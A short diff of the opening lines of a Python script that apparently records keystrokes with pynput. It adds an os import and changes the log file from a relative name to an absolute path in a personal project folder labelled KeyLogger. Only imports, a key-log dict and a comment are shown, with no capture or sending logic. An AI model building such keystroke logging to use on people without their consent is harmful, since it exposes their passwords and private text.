@@ -1,9 +1,10 @@
 from pynput import keyboard
 import threading
 import time
+import os
 
 new_key_logs = {}
-file_path = "KeyLogs.txt"
+file_path = "/home/ich/Dokumente/Progammieren_Privat/Python/Projekte/Automation/KeyLogger/KeyLogs.txt"
 
 
 # register all the key strokes and saves the values to an dict
